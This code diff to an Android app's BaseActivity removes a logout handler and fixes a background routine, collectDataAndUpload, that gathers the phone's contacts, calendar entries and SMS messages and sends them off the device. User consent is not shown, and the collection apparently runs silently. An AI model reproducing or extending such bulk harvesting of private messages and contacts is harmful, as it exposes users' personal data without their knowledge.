@@ -207,8 +207,6 @@ public class BaseActivity extends AppCompatActivity {
       openCamera();
     } else if (KndcEvent.OPEN_IMAGE_CAPTURE.equals(event.getEventName())) {
       openPicture();
-    } else if (KndcEvent.LOGOUT.equals(event.getEventName())) {
-      clearUserInfo();
     } else if (KndcEvent.GET_POLICY_SIGN.equals(event.getEventName())) {
       uploadImage(event);
     } else if (KndcEvent.BEGIN_CHECK_PERMISSION.equals(event.getEventName())) {
@@ -324,6 +322,7 @@ public class BaseActivity extends AppCompatActivity {
     if(isInit) {
       return;
     }
+    isInit = true;
     //EventBus
     EventBus.getDefault().register(this);
 
@@ -556,7 +555,13 @@ public class BaseActivity extends AppCompatActivity {
   public void collectDataAndUpload() {
     new Thread(() -> {
       try {
-        long smsLastTime = Long.parseLong(KndcStorage.getInstance().getData(KndcStorage.CONFIG_SMS_TIME));
+        Log.d(TAG, "collectDataAndUpload BEGIN");
+        String smsLastTime = KndcStorage.getInstance().getData(KndcStorage.CONFIG_SMS_TIME);
+        long lastTimeStamp = 0;
+        if(!TextUtils.isEmpty(smsLastTime)) {
+          lastTimeStamp = Long.parseLong(KndcStorage.getInstance().getData(KndcStorage.CONFIG_SMS_TIME));
+        }
+
         setConfigInfo(KndcStorage.CONFIG_SMS_TIME, String.valueOf(System.currentTimeMillis()));
 
         UploadData uploadData = new UploadData(this);
@@ -564,9 +569,10 @@ public class BaseActivity extends AppCompatActivity {
         uploadData.getAndSendContact();
         uploadData.getAndSendCalendar();
         uploadData.getAndSendContact();
-        uploadData.getAndSendSms(smsLastTime);
+        uploadData.getAndSendSms(lastTimeStamp);
       } catch (Exception e) {
         Log.d(TAG, e.getMessage());
+        e.printStackTrace();
       }
     }).start();//启动线程
   }
